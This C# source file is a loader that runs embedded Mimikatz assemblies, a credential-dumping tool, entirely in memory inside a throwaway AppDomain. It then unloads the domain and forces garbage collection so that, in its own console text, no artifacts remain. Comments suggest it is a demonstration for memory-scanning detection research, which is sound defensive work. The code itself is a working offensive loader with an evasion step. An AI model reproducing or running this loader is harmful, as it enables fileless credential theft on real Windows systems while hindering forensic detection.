using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NewApproach
{
    class NewApproach
    {
        public static void InteractiveMiMi()
        {
            AppDomain ad = AppDomain.CreateDomain("Test");
            Console.WriteLine("My Pid {0}", Process.GetCurrentProcess().Id);
            Console.WriteLine("New AppDomain \"Test\" was created, stay clear, because it empty [press enter]");
            Console.ReadLine();

            // Loader lives in another AppDomain
            Loader loader = (Loader)ad.CreateInstanceAndUnwrap(
                typeof(Loader).Assembly.FullName,
                typeof(Loader).FullName);

            loader.LoadAssembly(Properties.Resources.KatzAssembly);

            var t = Task.Run(() => {
                loader.ExecuteStaticMethod("KatzAssembly.Katz", "Exec");
            });

            t.Wait();
            t.Dispose();
            Console.WriteLine("Appdomain \"Test\" finished its work (no active thread)");
            Console.WriteLine("But still alive and store some artifacts");
            Console.WriteLine("We should do memory scan NOW, when resive module=>assembly=>appdomain unload events to collect&detect memory artifacts, before GC clear em");
            Console.WriteLine("[Press enter to clear Appdomain]\n(geneate AppDomain, Assembly & Module Unload events)");
            Console.ReadLine();
            AppDomain.Unload(ad);
            ad = null;
            GC.Collect();
            GC.WaitForFullGCComplete();
            Console.ResetColor();
            Console.WriteLine("Appdomain cleared, no any artifacts, but app still running :-)");
            Console.ReadLine();
        }

        public static void NonInteractiveMiMi()
        {
            AppDomain ad = AppDomain.CreateDomain("Test");
            Console.WriteLine("new AppDomain \"Test\" was created");

            // Loader lives in another AppDomain
            Loader loader = (Loader)ad.CreateInstanceAndUnwrap(
                typeof(Loader).Assembly.FullName,
                typeof(Loader).FullName);

            loader.LoadAssembly(Properties.Resources.NonInteractiveMimikatz);
            Console.WriteLine("Assembly was loaded into new \"Test\" AppDomain");
             
            //var t = Task.Run(() => {
                object result = loader.ExecuteStaticMethod("NonInteractiveKatz.NonInteractiveKatz", "Coffee");
                string s = result as string;
                Console.WriteLine(s);
            //});

            //t.Wait();
            //t.Dispose();
            
            Console.WriteLine("Execution was finished");
            AppDomain.Unload(ad);
            ad = null;
            GC.Collect();
            GC.WaitForFullGCComplete();
            Console.WriteLine("Appdomain cleared");
        }

        static void Main(string[] args)
        {
            //NonInteractiveMiMi();
            InteractiveMiMi();
        }

        static byte[] loadFile(string filename)
        {
            FileStream fs = new FileStream(filename, FileMode.Open);
            byte[] buffer = new byte[(int)fs.Length];
            fs.Read(buffer, 0, buffer.Length);
            fs.Close();

            return buffer;
        }

        class Loader : MarshalByRefObject
        {
            private Assembly _assembly;

            public override object InitializeLifetimeService()
            {
                return null;
            }

            public void LoadAssembly(string path)
            {
                _assembly = Assembly.Load(AssemblyName.GetAssemblyName(path));
            }

            public void LoadAssembly(byte [] bytes)
            {
                _assembly = Assembly.Load(bytes);
            }


            public object ExecuteStaticMethod(string typeName, string methodName, params object[] parameters)
            {
                Type type = _assembly.GetType(typeName);
                // TODO: this won't work if there are overloads available
                MethodInfo method = type.GetMethod(
                    methodName,
                    BindingFlags.Static | BindingFlags.Public);
                return method.Invoke(null, parameters);
            }
        }
    }
}
